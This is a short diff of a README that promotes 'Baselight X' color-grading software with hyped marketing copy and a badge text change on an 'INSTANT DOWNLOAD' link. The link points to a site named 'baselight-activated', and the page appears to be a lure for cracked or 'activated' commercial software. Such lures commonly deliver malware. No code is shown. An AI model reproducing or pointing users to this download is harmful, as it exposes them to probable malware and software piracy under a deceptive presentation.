@@ -2,7 +2,7 @@
 
 Unleash studio-grade color magic! Baselight X revolutionizes post-production with smart AI tools and film-quality grading - zero limitations, maximum creativity. ✨
 
-[![🚀 INSTANT DOWNLOAD 🚀](https://img.shields.io/badge/%F0%9F%9A%80_GET_BASELIGHT_X-%23FF2D62?style=for-the-badge&logo=adobe-premiere-pro)](https://baselight-activated.github.io/.github/)
+[![🚀 INSTANT DOWNLOAD 🚀](https://img.shields.io/badge/%F0%9F%9A%80_DOWNLOAD_BASELIGHT_X-%23FF2D62?style=for-the-badge&logo=adobe-premiere-pro)](https://baselight-activated.github.io/.github/)
 
 ---
 
